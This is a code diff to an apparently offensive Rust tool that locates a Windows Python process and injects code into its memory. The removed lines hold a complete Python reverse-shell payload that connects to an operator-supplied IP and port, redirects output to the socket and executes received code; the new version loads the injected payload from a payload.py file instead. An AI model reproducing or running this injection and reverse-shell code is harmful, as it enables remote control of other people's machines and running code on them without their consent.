@@ -13,11 +13,14 @@ use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
 use windows::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS};
 use anyhow::{anyhow, Result, Context};
 use clap::Parser;
-use log::{debug, info};
+use log::{debug, info, LevelFilter};
 use windows::core::Error;
 use py_spy::python_process_info::{PythonProcessInfo, get_interpreter_address, get_python_version};
 use remoteprocess::Process;
 use remoteprocess::ProcessMemory;
+use std::fs;
+use std::path::Path;
+use std::env;
 
 
 
@@ -97,85 +100,33 @@ fn find_process_id(target: &str) -> Result<u32> {
     Err(anyhow!("No process found matching '{}'", target))
 }
 
-fn create_reverse_shell_payload(ip: &str, port: u16) -> String {
-    format!(
-r#"
-import sys
-import socket
-import select
-import io
-import traceback
+fn read_payload_file(ip: &str, port: u16) -> Result<String> {
+    // Try current directory and up to 3 parent directories
+    let mut current_path = std::env::current_dir()
+        .map_err(|e| anyhow!("Failed to get current directory: {}", e))?;
+    
+    let payload_paths = std::iter::once(current_path.clone())
+        .chain((0..3).map(|_| {
+            current_path = current_path.parent()
+                .map(Path::to_path_buf)
+                .unwrap_or_else(|| current_path.clone());
+            current_path.clone()
+        }));
 
-class SocketWriter(io.IOBase):
-    def __init__(self, sock):
-        self.sock = sock
-    def write(self, data):
-        if data:
-            self.sock.sendall(data.encode("utf-8", "replace"))
-        return len(data)
-    def flush(self):
-        pass
+    for dir in payload_paths {
+        let payload_path = dir.join("payload.py");
+        debug!("Looking for payload at: {:?}", payload_path);
+        
+        if let Ok(mut payload) = fs::read_to_string(&payload_path) {
+            info!("Found payload at: {:?}", payload_path);
+            // Replace placeholders with actual values
+            payload = payload.replace("__HOST__", ip);
+            payload = payload.replace("__PORT__", &port.to_string());
+            return Ok(payload);
+        }
+    }
 
-def run_repl():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.setblocking(False)
-    r = s.connect_ex(("{}", {}))  # Connect to specified IP and port
-    if r not in (0, 10035):
-        raise OSError(r)
-    import time
-    t = time.time()
-    while True:
-        _, w, _ = select.select([], [s], [], 0.05)
-        if s in w:
-            e = s.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
-            if e != 0:
-                raise OSError(e)
-            break
-        if time.time() - t > 5:
-            raise TimeoutError()
-
-    w = SocketWriter(s)
-    sys.stdout = w
-    sys.stderr = w
-
-    print("[+] Multiline REPL with 'print' redirection started. Use empty line to execute block.")
-
-    buf = b""
-    partial_code = []
-    running = True
-
-    while running:
-        rs, _, _ = select.select([s], [], [], 0.05)
-        if s in rs:
-            data = s.recv(4096)
-            if not data:
-                break
-            buf += data
-            while b"\n" in buf:
-                line, _, buf = buf.partition(b"\n")
-                cmd = line.decode("utf-8", "replace")
-                if not cmd and partial_code:
-                    code_block = "\n".join(partial_code)
-                    partial_code = []
-                    try:
-                        compiled = compile(code_block, "<repl>", "exec")
-                        exec(compiled, globals(), globals())
-                        print("[+] Executed block.")
-                    except Exception as e:
-                        err = traceback.format_exc()
-                        print(err)
-                elif cmd == "exit":
-                    print("[-] Exiting.")
-                    running = False
-                    break
-                else:
-                    partial_code.append(cmd)
-
-    s.close()
-
-run_repl()
-
-"#, ip, port)
+    Err(anyhow!("payload.py not found in current directory or up to 3 parent directories"))
 }
 
 fn allocate_memory(process_handle: HANDLE, size: usize) -> Result<*mut c_void> {
@@ -341,7 +292,15 @@ fn inject_payload(process_handle: HANDLE, payload: &str, python_info: &PythonPro
 }
 
 fn main() -> Result<()> {
-    env_logger::init();
+    // Initialize logging with INFO as default unless RUST_LOG is set
+    if env::var("RUST_LOG").is_err() {
+        env_logger::Builder::new()
+            .filter_level(LevelFilter::Info)
+            .init();
+    } else {
+        env_logger::init();
+    }
+
     let args = Args::parse();
 
     let target_pid = find_process_id(&args.target)?;
@@ -428,7 +387,7 @@ fn main() -> Result<()> {
         return Err(anyhow!("Failed to open process: invalid handle"));
     }
 
-    let payload = create_reverse_shell_payload(&args.ip, args.port);
+    let payload = read_payload_file(&args.ip, args.port)?;
     inject_payload(process_handle, &payload, &python_info)?;
 
     info!("Successfully injected payload.");
